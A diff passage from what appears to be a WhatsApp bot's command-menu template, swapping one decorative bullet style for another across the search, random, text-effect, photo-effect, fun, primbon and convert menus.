 │ 〘 SEARCH MENU 〙
 ╰─────────────────╮
 ╭─────────────────╯
-│➣ ${prefix}𝚙𝚕𝚊𝚢 [𝚚𝚞𝚎𝚛𝚢]
-│➣ ${prefix}𝚢𝚝𝚜 [𝚚𝚞𝚎𝚛𝚢]
-│➣ ${prefix}𝚐𝚘𝚘𝚐𝚕𝚎 [𝚚𝚞𝚎𝚛𝚢]
-│➣ ${prefix}𝚐𝚒𝚖𝚊𝚐𝚎 [𝚚𝚞𝚎𝚛𝚢]
-│➣ ${prefix}𝚙𝚒𝚗𝚝𝚎𝚛𝚎𝚜𝚝 [𝚚𝚞𝚎𝚛𝚢]
-│➣ ${prefix}𝚠𝚊𝚕𝚕𝚙𝚊𝚙𝚎𝚛 [𝚚𝚞𝚎𝚛𝚢]
-│➣ ${prefix}𝚠𝚒𝚔𝚒𝚖𝚎𝚍𝚒𝚊 [𝚚𝚞𝚎𝚛𝚢]
-│➣ ${prefix}𝚢𝚝𝚜𝚎𝚊𝚛𝚌𝚑 [𝚚𝚞𝚎𝚛𝚢]
-│➣ ${prefix}𝚛𝚒𝚗𝚐𝚝𝚘𝚗𝚎 [𝚚𝚞𝚎𝚛𝚢]
-│➣ ${prefix}𝚜𝚝𝚊𝚕𝚔 [𝚘𝚙𝚝𝚒𝚘𝚗] [𝚚𝚞𝚎𝚛𝚢]
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚙𝚕𝚊𝚢 [𝚚𝚞𝚎𝚛𝚢]
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚢𝚝𝚜 [𝚚𝚞𝚎𝚛𝚢]
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚐𝚘𝚘𝚐𝚕𝚎 [𝚚𝚞𝚎𝚛𝚢]
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚐𝚒𝚖𝚊𝚐𝚎 [𝚚𝚞𝚎𝚛𝚢]
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚙𝚒𝚗𝚝𝚎𝚛𝚎𝚜𝚝 [𝚚𝚞𝚎𝚛𝚢]
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚠𝚊𝚕𝚕𝚙𝚊𝚙𝚎𝚛 [𝚚𝚞𝚎𝚛𝚢]
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚠𝚒𝚔𝚒𝚖𝚎𝚍𝚒𝚊 [𝚚𝚞𝚎𝚛𝚢]
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚢𝚝𝚜𝚎𝚊𝚛𝚌𝚑 [𝚚𝚞𝚎𝚛𝚢]
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚛𝚒𝚗𝚐𝚝𝚘𝚗𝚎 [𝚚𝚞𝚎𝚛𝚢]
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚝𝚊𝚕𝚔 [𝚘𝚙𝚝𝚒𝚘𝚗] [𝚚𝚞𝚎𝚛𝚢]
 ╰─────────────────╮
 ╭─────────────────╯
 │ 〘 RANDOM MENU 〙
 ╰─────────────────╮
 ╭─────────────────╯
-│➣ ${prefix}𝚌𝚘𝚏𝚏𝚎
-│➣ ${prefix}𝚚𝚞𝚘𝚝𝚎𝚜𝚊𝚗𝚒𝚖𝚎
-│➣ ${prefix}𝚖𝚘𝚝𝚒𝚟𝚊𝚜𝚒
-│➣ ${prefix}𝚍𝚒𝚕𝚊𝚗𝚚𝚞𝚘𝚝𝚎
-│➣ ${prefix}𝚋𝚞𝚌𝚒𝚗𝚚𝚞𝚘𝚝𝚎
-│➣ ${prefix}𝚔𝚊𝚝𝚊𝚜𝚎𝚗𝚓𝚊
-│➣ ${prefix}𝚙𝚞𝚒𝚜𝚒
-│➣ ${prefix}𝚌𝚘𝚞𝚙𝚕𝚎
-│➣ ${prefix}𝚊𝚗𝚒𝚖𝚎
-│➣ ${prefix}𝚠𝚊𝚒𝚏𝚞
-│➣ ${prefix}𝚑𝚞𝚜𝚋𝚞
-│➣ ${prefix}𝚗𝚎𝚔𝚘
-│➣ ${prefix}𝚜𝚑𝚒𝚗𝚘𝚋𝚞
-│➣ ${prefix}𝚠𝚊𝚒𝚏𝚞𝚜 (𝚗𝚜𝚏𝚠)
-│➣ ${prefix}𝚗𝚎𝚔𝚘𝚜 (𝚗𝚜𝚏𝚠)
-│➣ ${prefix}𝚝𝚛𝚊𝚙 (𝚗𝚜𝚏𝚠)
-│➣ ${prefix}𝚋𝚕𝚘𝚠𝚓𝚘𝚋 (𝚗𝚜𝚏𝚠)
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚌𝚘𝚏𝚏𝚎
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚚𝚞𝚘𝚝𝚎𝚜𝚊𝚗𝚒𝚖𝚎
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚖𝚘𝚝𝚒𝚟𝚊𝚜𝚒
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚍𝚒𝚕𝚊𝚗𝚚𝚞𝚘𝚝𝚎
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚋𝚞𝚌𝚒𝚗𝚚𝚞𝚘𝚝𝚎
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚔𝚊𝚝𝚊𝚜𝚎𝚗𝚓𝚊
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚙𝚞𝚒𝚜𝚒
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚌𝚘𝚞𝚙𝚕𝚎
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚊𝚗𝚒𝚖𝚎
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚠𝚊𝚒𝚏𝚞
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚑𝚞𝚜𝚋𝚞
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚗𝚎𝚔𝚘
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚑𝚒𝚗𝚘𝚋𝚞
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚠𝚊𝚒𝚏𝚞𝚜 (𝚗𝚜𝚏𝚠)
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚗𝚎𝚔𝚘𝚜 (𝚗𝚜𝚏𝚠)
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚛𝚊𝚙 (𝚗𝚜𝚏𝚠)
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚋𝚕𝚘𝚠𝚓𝚘𝚋 (𝚗𝚜𝚏𝚠)
 ╰─────────────────╮
 ╭─────────────────╯
 │ 〘 TEKS PRO MENU 〙
 ╰─────────────────╮
 ╭─────────────────╯
-│➣ ${prefix}3𝚍𝚌𝚑𝚛𝚒𝚜𝚝𝚖𝚊𝚜
-│➣ ${prefix}3𝚍𝚍𝚎𝚎𝚙𝚜𝚎𝚊
-│➣ ${prefix}𝚊𝚖𝚎𝚛𝚒𝚌𝚊𝚗𝚏𝚕𝚊𝚐
-│➣ ${prefix}3𝚍𝚜𝚌𝚒𝚏𝚒
-│➣ ${prefix}3𝚍𝚛𝚊𝚒𝚗𝚋𝚘𝚠
-│➣ ${prefix}3𝚍𝚠𝚊𝚝𝚎𝚛𝚙𝚒𝚙𝚎
-│➣ ${prefix}𝚑𝚊𝚕𝚕𝚘𝚠𝚎𝚎𝚗𝚜𝚔𝚎𝚕𝚎𝚝𝚘𝚗
-│➣ ${prefix}𝚜𝚔𝚎𝚝𝚌𝚑
-│➣ ${prefix}𝚋𝚕𝚞𝚎𝚌𝚒𝚛𝚌𝚞𝚒𝚝
-│➣ ${prefix}𝚜𝚙𝚊𝚌𝚎
-│➣ ${prefix}𝚖𝚎𝚝𝚊𝚕𝚕𝚒𝚌
-│➣ ${prefix}𝚏𝚒𝚌𝚝𝚒𝚘𝚗
-│➣ ${prefix}𝚐𝚛𝚎𝚎𝚗𝚑𝚘𝚛𝚛𝚘𝚛
-│➣ ${prefix}𝚝𝚛𝚊𝚗𝚜𝚏𝚘𝚛𝚖𝚎𝚛
-│➣ ${prefix}𝚋𝚎𝚛𝚛𝚢
-│➣ ${prefix}𝚝𝚑𝚞𝚗𝚍𝚎𝚛
-│➣ ${prefix}𝚖𝚊𝚐𝚖𝚊
-│➣ ${prefix}3𝚍𝚌𝚛𝚊𝚌𝚔𝚎𝚍𝚜𝚝𝚘𝚗𝚎
-│➣ ${prefix}3𝚍𝚗𝚎𝚘𝚗𝚕𝚒𝚐𝚑𝚝
-│➣ ${prefix}𝚒𝚖𝚙𝚛𝚎𝚜𝚜𝚒𝚟𝚎𝚐𝚕𝚒𝚝𝚌𝚑
-│➣ ${prefix}𝚗𝚊𝚝𝚞𝚛𝚊𝚕𝚕𝚎𝚊𝚟𝚎𝚜
-│➣ ${prefix}𝚏𝚒𝚛𝚎𝚠𝚘𝚛𝚔𝚜𝚙𝚊𝚛𝚔𝚕𝚎
-│➣ ${prefix}𝚖𝚊𝚝𝚛𝚒𝚡
-│➣ ${prefix}𝚍𝚛𝚘𝚙𝚠𝚊𝚝𝚎𝚛
-│➣ ${prefix}𝚑𝚊𝚛𝚛𝚢𝚙𝚘𝚝𝚝𝚎𝚛
-│➣ ${prefix}𝚏𝚘𝚐𝚐𝚢𝚠𝚒𝚗𝚍𝚘𝚠
-│➣ ${prefix}𝚗𝚎𝚘𝚗𝚍𝚎𝚟𝚒𝚕𝚜
-│➣ ${prefix}𝚌𝚑𝚛𝚒𝚜𝚝𝚖𝚊𝚜𝚑𝚘𝚕𝚒𝚍𝚊𝚢
-│➣ ${prefix}3𝚍𝚐𝚛𝚊𝚍𝚒𝚎𝚗𝚝
-│➣ ${prefix}𝚋𝚕𝚊𝚌𝚔𝚙𝚒𝚗𝚔
-│➣ ${prefix}𝚐𝚕𝚞𝚎𝚝𝚎𝚡𝚝
+││᭄⃟ꪶ⃟•╾ ${prefix}3𝚍𝚌𝚑𝚛𝚒𝚜𝚝𝚖𝚊𝚜
+││᭄⃟ꪶ⃟•╾ ${prefix}3𝚍𝚍𝚎𝚎𝚙𝚜𝚎𝚊
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚊𝚖𝚎𝚛𝚒𝚌𝚊𝚗𝚏𝚕𝚊𝚐
+││᭄⃟ꪶ⃟•╾ ${prefix}3𝚍𝚜𝚌𝚒𝚏𝚒
+││᭄⃟ꪶ⃟•╾ ${prefix}3𝚍𝚛𝚊𝚒𝚗𝚋𝚘𝚠
+││᭄⃟ꪶ⃟•╾ ${prefix}3𝚍𝚠𝚊𝚝𝚎𝚛𝚙𝚒𝚙𝚎
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚑𝚊𝚕𝚕𝚘𝚠𝚎𝚎𝚗𝚜𝚔𝚎𝚕𝚎𝚝𝚘𝚗
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚔𝚎𝚝𝚌𝚑
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚋𝚕𝚞𝚎𝚌𝚒𝚛𝚌𝚞𝚒𝚝
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚙𝚊𝚌𝚎
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚖𝚎𝚝𝚊𝚕𝚕𝚒𝚌
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚏𝚒𝚌𝚝𝚒𝚘𝚗
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚐𝚛𝚎𝚎𝚗𝚑𝚘𝚛𝚛𝚘𝚛
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚛𝚊𝚗𝚜𝚏𝚘𝚛𝚖𝚎𝚛
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚋𝚎𝚛𝚛𝚢
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚑𝚞𝚗𝚍𝚎𝚛
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚖𝚊𝚐𝚖𝚊
+││᭄⃟ꪶ⃟•╾ ${prefix}3𝚍𝚌𝚛𝚊𝚌𝚔𝚎𝚍𝚜𝚝𝚘𝚗𝚎
+││᭄⃟ꪶ⃟•╾ ${prefix}3𝚍𝚗𝚎𝚘𝚗𝚕𝚒𝚐𝚑𝚝
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚒𝚖𝚙𝚛𝚎𝚜𝚜𝚒𝚟𝚎𝚐𝚕𝚒𝚝𝚌𝚑
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚗𝚊𝚝𝚞𝚛𝚊𝚕𝚕𝚎𝚊𝚟𝚎𝚜
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚏𝚒𝚛𝚎𝚠𝚘𝚛𝚔𝚜𝚙𝚊𝚛𝚔𝚕𝚎
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚖𝚊𝚝𝚛𝚒𝚡
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚍𝚛𝚘𝚙𝚠𝚊𝚝𝚎𝚛
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚑𝚊𝚛𝚛𝚢𝚙𝚘𝚝𝚝𝚎𝚛
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚏𝚘𝚐𝚐𝚢𝚠𝚒𝚗𝚍𝚘𝚠
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚗𝚎𝚘𝚗𝚍𝚎𝚟𝚒𝚕𝚜
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚌𝚑𝚛𝚒𝚜𝚝𝚖𝚊𝚜𝚑𝚘𝚕𝚒𝚍𝚊𝚢
+││᭄⃟ꪶ⃟•╾ ${prefix}3𝚍𝚐𝚛𝚊𝚍𝚒𝚎𝚗𝚝
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚋𝚕𝚊𝚌𝚔𝚙𝚒𝚗𝚔
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚐𝚕𝚞𝚎𝚝𝚎𝚡𝚝
 ╰─────────────────╮
 ╭─────────────────╯
 │〘PHOTO OXY MENU〙
 ╰─────────────────╮
 ╭─────────────────╯
-│➣ ${prefix}𝚜𝚑𝚊𝚍𝚘𝚠
-│➣ ${prefix}𝚛𝚘𝚖𝚊𝚗𝚝𝚒𝚌
-│➣ ${prefix}𝚜𝚖𝚘𝚔𝚎
-│➣ ${prefix}𝚋𝚞𝚛𝚗𝚙𝚊𝚙𝚙𝚎𝚛
-│➣ ${prefix}𝚗𝚊𝚛𝚞𝚝𝚘
-│➣ ${prefix}𝚕𝚘𝚟𝚎𝚖𝚜𝚐
-│➣ ${prefix}𝚐𝚛𝚊𝚜𝚜𝚖𝚜𝚐
-│➣ ${prefix}𝚕𝚘𝚟𝚎𝚝𝚎𝚡𝚝
-│➣ ${prefix}𝚌𝚘𝚏𝚏𝚎𝚌𝚞𝚙
-│➣ ${prefix}𝚋𝚞𝚝𝚝𝚎𝚛𝚏𝚕𝚢
-│➣ ${prefix}𝚑𝚊𝚛𝚛𝚢𝚙𝚘𝚝𝚝𝚎𝚛
-│➣ ${prefix}𝚛𝚎𝚝𝚛𝚘𝚕𝚘𝚕
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚑𝚊𝚍𝚘𝚠
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚛𝚘𝚖𝚊𝚗𝚝𝚒𝚌
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚖𝚘𝚔𝚎
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚋𝚞𝚛𝚗𝚙𝚊𝚙𝚙𝚎𝚛
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚗𝚊𝚛𝚞𝚝𝚘
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚕𝚘𝚟𝚎𝚖𝚜𝚐
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚐𝚛𝚊𝚜𝚜𝚖𝚜𝚐
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚕𝚘𝚟𝚎𝚝𝚎𝚡𝚝
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚌𝚘𝚏𝚏𝚎𝚌𝚞𝚙
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚋𝚞𝚝𝚝𝚎𝚛𝚏𝚕𝚢
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚑𝚊𝚛𝚛𝚢𝚙𝚘𝚝𝚝𝚎𝚛
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚛𝚎𝚝𝚛𝚘𝚕𝚘𝚕
 ╰─────────────────╮
 ╭─────────────────╯
 │ 〘 EPHOTO MENU 〙
 ╰─────────────────╮
 ╭─────────────────╯
-│➣ ${prefix}𝚏𝚏𝚌𝚘𝚟𝚎𝚛
-│➣ ${prefix}𝚌𝚛𝚘𝚜𝚜𝚏𝚒𝚛𝚎
-│➣ ${prefix}𝚐𝚊𝚕𝚊𝚡𝚢
-│➣ ${prefix}𝚐𝚕𝚊𝚜𝚜
-│➣ ${prefix}𝚗𝚎𝚘𝚗
-│➣ ${prefix}𝚋𝚎𝚊𝚌𝚑
-│➣ ${prefix}𝚋𝚕𝚊𝚌𝚔𝚙𝚒𝚗𝚔
-│➣ ${prefix}𝚒𝚐𝚌𝚎𝚛𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚎
-│➣ ${prefix}𝚢𝚝𝚌𝚎𝚛𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚎
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚏𝚏𝚌𝚘𝚟𝚎𝚛
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚌𝚛𝚘𝚜𝚜𝚏𝚒𝚛𝚎
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚐𝚊𝚕𝚊𝚡𝚢
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚐𝚕𝚊𝚜𝚜
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚗𝚎𝚘𝚗
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚋𝚎𝚊𝚌𝚑
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚋𝚕𝚊𝚌𝚔𝚙𝚒𝚗𝚔
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚒𝚐𝚌𝚎𝚛𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚎
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚢𝚝𝚌𝚎𝚛𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚎
 ╰─────────────────╮
 ╭─────────────────╯
 │    〘 FUN MENU 〙
 ╰─────────────────╮
 ╭─────────────────╯
-│➣ ${prefix}𝚜𝚒𝚖𝚒𝚑
-│➣ ${prefix}𝚑𝚊𝚕𝚊𝚑
-│➣ ${prefix}𝚑𝚒𝚕𝚒𝚑
-│➣ ${prefix}𝚑𝚞𝚕𝚞𝚑
-│➣ ${prefix}𝚑𝚎𝚕𝚎𝚑
-│➣ ${prefix}𝚑𝚘𝚕𝚘𝚑
-│➣ ${prefix}𝚓𝚊𝚍𝚒𝚊𝚗
-│➣ ${prefix}𝚓𝚘𝚍𝚘𝚑𝚔𝚞
-│➣ ${prefix}𝚍𝚎𝚕𝚝𝚝𝚝
-│➣ ${prefix}𝚝𝚒𝚌𝚝𝚊𝚌𝚝𝚘𝚎
-│➣ ${prefix}𝚏𝚊𝚖𝚒𝚕𝚢100
-│➣ ${prefix}𝚝𝚎𝚋𝚊𝚔 [𝚘𝚙𝚝𝚒𝚘𝚗]
-│➣ ${prefix}𝚖𝚊𝚝𝚑 [𝚖𝚘𝚍𝚎]
-│➣ ${prefix}𝚜𝚞𝚒𝚝𝚙𝚟𝚙 [@𝚝𝚊𝚐]
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚒𝚖𝚒𝚑
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚑𝚊𝚕𝚊𝚑
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚑𝚒𝚕𝚒𝚑
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚑𝚞𝚕𝚞𝚑
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚑𝚎𝚕𝚎𝚑
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚑𝚘𝚕𝚘𝚑
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚓𝚊𝚍𝚒𝚊𝚗
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚓𝚘𝚍𝚘𝚑𝚔𝚞
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚍𝚎𝚕𝚝𝚝𝚝
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚒𝚌𝚝𝚊𝚌𝚝𝚘𝚎
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚏𝚊𝚖𝚒𝚕𝚢100
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚎𝚋𝚊𝚔 [𝚘𝚙𝚝𝚒𝚘𝚗]
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚖𝚊𝚝𝚑 [𝚖𝚘𝚍𝚎]
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚞𝚒𝚝𝚙𝚟𝚙 [@𝚝𝚊𝚐]
 ╰─────────────────╮
 ╭─────────────────╯
 │ 〘 PRIMBON MENU 〙
 ╰─────────────────╮
 ╭─────────────────╯
-│➣ ${prefix}𝚗𝚘𝚖𝚘𝚛𝚑𝚘𝚔𝚒
-│➣ ${prefix}𝚊𝚛𝚝𝚒𝚖𝚒𝚖𝚙𝚒
-│➣ ${prefix}𝚊𝚛𝚝𝚒𝚗𝚊𝚖𝚊
-│➣ ${prefix}𝚛𝚊𝚖𝚊𝚕𝚓𝚘𝚍𝚘𝚑
-│➣ ${prefix}𝚛𝚊𝚖𝚊𝚕𝚓𝚘𝚍𝚘𝚑𝚋𝚊𝚕𝚒
-│➣ ${prefix}𝚜𝚞𝚊𝚖𝚒𝚒𝚜𝚝𝚛𝚒
-│➣ ${prefix}𝚛𝚊𝚖𝚊𝚕𝚌𝚒𝚗𝚝𝚊
-│➣ ${prefix}𝚌𝚘𝚌𝚘𝚔𝚗𝚊𝚖𝚊
-│➣ ${prefix}𝚙𝚊𝚜𝚊𝚗𝚐𝚊𝚗
-│➣ ${prefix}𝚓𝚊𝚍𝚒𝚊𝚗𝚗𝚒𝚔𝚊𝚑
-│➣ ${prefix}𝚜𝚒𝚏𝚊𝚝𝚞𝚜𝚊𝚑𝚊
-│➣ ${prefix}𝚛𝚎𝚣𝚎𝚔𝚒
-│➣ ${prefix}𝚙𝚎𝚔𝚎𝚛𝚓𝚊𝚊𝚗
-│➣ ${prefix}𝚗𝚊𝚜𝚒𝚋
-│➣ ${prefix}𝚙𝚎𝚗𝚢𝚊𝚔𝚒𝚝
-│➣ ${prefix}𝚝𝚊𝚛𝚘𝚝
-│➣ ${prefix}𝚏𝚎𝚗𝚐𝚜𝚑𝚞𝚒
-│➣ ${prefix}𝚑𝚊𝚛𝚒𝚋𝚊𝚒𝚔
-│➣ ${prefix}𝚑𝚊𝚛𝚒𝚜𝚊𝚗𝚐𝚊𝚛
-│➣ ${prefix}𝚑𝚊𝚛𝚒𝚜𝚒𝚊𝚕
-│➣ ${prefix}𝚗𝚊𝚐𝚊𝚑𝚊𝚛𝚒
-│➣ ${prefix}𝚊𝚛𝚊𝚑𝚛𝚎𝚣𝚎𝚔𝚒
-│➣ ${prefix}𝚙𝚎𝚛𝚞𝚗𝚝𝚞𝚗𝚐𝚊𝚗
-│➣ ${prefix}𝚠𝚎𝚝𝚘𝚗
-│➣ ${prefix}𝚔𝚊𝚛𝚊𝚔𝚝𝚎𝚛
-│➣ ${prefix}𝚔𝚎𝚋𝚎𝚛𝚞𝚗𝚝𝚞𝚗𝚐𝚊𝚗
-│➣ ${prefix}𝚖𝚎𝚖𝚊𝚗𝚌𝚒𝚗𝚐
-│➣ ${prefix}𝚖𝚊𝚜𝚊𝚜𝚞𝚋𝚞𝚛
-│➣ ${prefix}𝚣𝚘𝚍𝚒𝚊𝚔
-│➣ ${prefix}𝚜𝚑𝚒𝚘
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚗𝚘𝚖𝚘𝚛𝚑𝚘𝚔𝚒
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚊𝚛𝚝𝚒𝚖𝚒𝚖𝚙𝚒
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚊𝚛𝚝𝚒𝚗𝚊𝚖𝚊
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚛𝚊𝚖𝚊𝚕𝚓𝚘𝚍𝚘𝚑
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚛𝚊𝚖𝚊𝚕𝚓𝚘𝚍𝚘𝚑𝚋𝚊𝚕𝚒
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚞𝚊𝚖𝚒𝚒𝚜𝚝𝚛𝚒
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚛𝚊𝚖𝚊𝚕𝚌𝚒𝚗𝚝𝚊
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚌𝚘𝚌𝚘𝚔𝚗𝚊𝚖𝚊
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚙𝚊𝚜𝚊𝚗𝚐𝚊𝚗
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚓𝚊𝚍𝚒𝚊𝚗𝚗𝚒𝚔𝚊𝚑
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚒𝚏𝚊𝚝𝚞𝚜𝚊𝚑𝚊
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚛𝚎𝚣𝚎𝚔𝚒
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚙𝚎𝚔𝚎𝚛𝚓𝚊𝚊𝚗
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚗𝚊𝚜𝚒𝚋
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚙𝚎𝚗𝚢𝚊𝚔𝚒𝚝
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚊𝚛𝚘𝚝
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚏𝚎𝚗𝚐𝚜𝚑𝚞𝚒
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚑𝚊𝚛𝚒𝚋𝚊𝚒𝚔
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚑𝚊𝚛𝚒𝚜𝚊𝚗𝚐𝚊𝚛
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚑𝚊𝚛𝚒𝚜𝚒𝚊𝚕
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚗𝚊𝚐𝚊𝚑𝚊𝚛𝚒
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚊𝚛𝚊𝚑𝚛𝚎𝚣𝚎𝚔𝚒
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚙𝚎𝚛𝚞𝚗𝚝𝚞𝚗𝚐𝚊𝚗
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚠𝚎𝚝𝚘𝚗
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚔𝚊𝚛𝚊𝚔𝚝𝚎𝚛
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚔𝚎𝚋𝚎𝚛𝚞𝚗𝚝𝚞𝚗𝚐𝚊𝚗
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚖𝚎𝚖𝚊𝚗𝚌𝚒𝚗𝚐
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚖𝚊𝚜𝚊𝚜𝚞𝚋𝚞𝚛
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚣𝚘𝚍𝚒𝚊𝚔
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚑𝚒𝚘
 ╰─────────────────╮
 ╭─────────────────╯
 │ 〘 CONVERT MENU 〙
 ╰─────────────────╮
 ╭─────────────────╯
-│➣ ${prefix}𝚊𝚝𝚝𝚙
-│➣ ${prefix}𝚝𝚝𝚙
-│➣ ${prefix}𝚝𝚘𝚒𝚖𝚊𝚐𝚎
-│➣ ${prefix}𝚛𝚎𝚖𝚘𝚟𝚎𝚋𝚐
-│➣ ${prefix}𝚜𝚝𝚒𝚌𝚔𝚎𝚛
-│➣ ${prefix}𝚎𝚖𝚘𝚓𝚒𝚖𝚒𝚡
-│➣ ${prefix}𝚎𝚖𝚘𝚓𝚒𝚖𝚒𝚡2
-│➣ ${prefix}𝚝𝚘𝚟𝚒𝚍𝚎𝚘
-│➣ ${prefix}𝚝𝚘𝚐𝚒𝚏
-│➣ ${prefix}𝚝𝚘𝚞𝚛𝚕
-│➣ ${prefix}𝚝𝚘𝚟𝚗
-│➣ ${prefix}𝚝𝚘𝚖𝚙3
-│➣ ${prefix}𝚝𝚘𝚊𝚞𝚍𝚒𝚘
-│➣ ${prefix}𝚎𝚋𝚒𝚗𝚊𝚛𝚢
-│➣ ${prefix}𝚍𝚋𝚒𝚗𝚊𝚛𝚢
-│➣ ${prefix}𝚜𝚝𝚢𝚕𝚎𝚝𝚎𝚡𝚝
-│➣ ${prefix}𝚜𝚖𝚎𝚖𝚎
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚊𝚝𝚝𝚙
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚝𝚙
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚘𝚒𝚖𝚊𝚐𝚎
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚛𝚎𝚖𝚘𝚟𝚎𝚋𝚐
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚝𝚒𝚌𝚔𝚎𝚛
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚎𝚖𝚘𝚓𝚒𝚖𝚒𝚡
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚎𝚖𝚘𝚓𝚒𝚖𝚒𝚡2
